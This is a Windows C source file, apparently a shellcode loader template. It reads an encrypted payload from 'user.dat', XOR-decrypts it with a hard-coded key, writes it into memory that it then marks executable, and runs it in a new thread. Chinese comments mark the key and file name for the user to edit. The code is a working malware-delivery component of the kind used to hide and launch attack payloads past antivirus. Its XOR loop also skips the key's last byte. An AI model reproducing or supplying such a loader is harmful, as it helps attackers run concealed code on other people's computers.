#include <Windows.h>
#include <stdio.h>

#pragma warning(disable:4996)

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main() {

	FILE* fp;
	SIZE_T size;
	unsigned char* buf;

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	//修改这里
	char key[] = "key";

	//修改这里
	fp = fopen("user.dat", "rb");
	fseek(fp, 0, SEEK_END);
	size = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	buf = (unsigned char*)malloc(size);

	fread(buf, size, 1, fp);

	exec_mem = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	XOR((char*)buf, size, key, sizeof(key));

	RtlMoveMemory(exec_mem, buf, size);

	rv = VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &oldprotect);

	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}
	return 0;
}